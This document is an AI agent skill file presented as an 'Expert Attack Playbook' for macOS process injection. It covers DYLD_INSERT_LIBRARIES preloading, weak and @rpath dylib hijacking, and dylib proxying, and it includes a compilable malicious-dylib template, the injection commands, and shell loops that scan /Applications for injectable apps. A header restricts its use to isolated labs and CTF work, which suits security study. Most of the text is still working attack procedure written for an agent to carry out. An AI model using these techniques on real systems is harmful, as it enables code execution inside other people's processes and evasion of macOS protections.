---
name: macos-process-injection
description: >-
  macOS process injection playbook. Use when you need to inject code into running or launching macOS processes via dylib hijacking, DYLD environment variables, XPC exploitation, Mach port manipulation, or Electron/Chromium abuse.
---

# SKILL: macOS Process Injection — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert macOS process injection techniques. Covers DYLD_INSERT_LIBRARIES, dylib hijacking (weak/rpath/proxy), XPC PID reuse attacks, Mach port manipulation, MIG abuse, and Electron injection. Pay particular attention to entitlement prerequisites and SIP constraints on injection vectors.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `macos-security-bypass` when you need to bypass TCC, Gatekeeper, or SIP protections blocking your injection
- `linux-privilege-escalation` for Unix-layer escalation (shared object hijacking concepts apply)

### Advanced Reference

Also inspect [DYLIB_XPC_TECHNIQUES.md](./DYLIB_XPC_TECHNIQUES.md) when you need:
- Step-by-step dylib hijacking methodology with tooling commands
- XPC exploitation walkthrough with code examples
- Mach port technique details and task_for_pid patterns

---

## 1. DYLD_INSERT_LIBRARIES INJECTION

The most straightforward injection: set an environment variable that forces the dynamic linker to preload your dylib.

### 1.1 Requirements and Restrictions

| Condition | Can Inject? | Reason |
|---|---|---|
| Normal (non-hardened) binary | Yes | No restrictions |
| Hardened Runtime enabled | No | DYLD strips env vars |
| Hardened Runtime + `com.apple.security.cs.allow-dyld-environment-variables` | Yes | Entitlement explicitly allows it |
| Apple system binary (SIP-protected) | No | DYLD env vars stripped by SIP |
| SUID/SGID binary | No | DYLD env vars stripped for privilege safety |
| App Sandbox enabled | No | Sandbox blocks env var injection |

### 1.2 Basic Injection

```bash
# Create malicious dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    printf("[+] Injected into PID %d\n", getpid());
    // payload here
}
EOF

# Compile for both architectures
gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64

# Inject into target
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target
```

### 1.3 Finding Injectable Targets

```bash
# Find apps WITHOUT hardened runtime
find /Applications -name "*.app" -exec sh -c '
  binary=$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  if [ -n "$binary" ]; then
    flags=$(codesign -d --verbose "$1/Contents/MacOS/$binary" 2>&1)
    echo "$flags" | grep -q "runtime" || echo "No Hardened Runtime: $1"
  fi
' _ {} \;

# Find apps with dyld env var entitlement
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/"$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  codesign -d --entitlements :- "$binary" 2>/dev/null | \
    grep -q "allow-dyld-environment-variables" && echo "DYLD injectable: $1"
' _ {} \;
```

---

## 2. DYLIB HIJACKING

Exploit the dynamic linker's library search order to load attacker-controlled dylibs instead of (or in addition to) legitimate ones.

### 2.1 Weak Dylib Hijacking (LC_LOAD_WEAK_DYLIB)

Weak dylibs are optional — if missing, the binary still runs. If you can place a dylib at the expected path, it loads.

```bash
# Find binaries with weak dylib references
otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB

# Check if the weak dylib actually exists
otool -L /path/to/binary | grep weak | while read lib rest; do
  [ ! -f "$lib" ] && echo "MISSING (hijackable): $lib"
done
```

### 2.2 @rpath Hijacking

`@rpath` is resolved from `LC_RPATH` entries in the binary. If an earlier rpath directory is writable, you can place your dylib there.

```bash
# List rpath entries
otool -l /path/to/binary | grep -A 2 LC_RPATH

# List rpath-relative dylib references
otool -L /path/to/binary | grep @rpath

# If rpath includes writable directory (e.g., app's Frameworks/)
# place malicious dylib with matching name there
```

### 2.3 Dylib Proxying

Replace a legitimate dylib with a malicious one that forwards all exports to the original.

```bash
# Step 1: Identify target dylib and its exports
nm -gU /path/to/original.dylib | awk '{print $3}'

# Step 2: Create proxy dylib that re-exports everything
# Move original to original_real.dylib
# Create proxy:
cat > proxy.c << 'EOF'
__attribute__((constructor))
void payload() {
    // malicious code here
}
EOF

gcc -dynamiclib -o hijacked.dylib proxy.c \
  -Wl,-reexport_library,/path/to/original_real.dylib \
  -arch x86_64 -arch arm64
```

### 2.4 Dependency Enumeration

```bash
otool -L /path/to/binary              # List all dylib dependencies
otool -l /path/to/binary              # Full load commands (rpaths, weak, etc.)
dyldinfo -print_dependencies /path/to/binary  # Detailed dependency info (pre-Ventura)
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 3. XPC EXPLOITATION
- 4. MACH PORT MANIPULATION
- 5. MIG (MACH INTERFACE GENERATOR) ABUSE
- 6. ELECTRON / CHROMIUM INJECTION
- 7. APPLICATION SCRIPTING (APPLE EVENTS)
- 8. PROCESS INJECTION DECISION TREE
- 9. DETECTION & FORENSICS
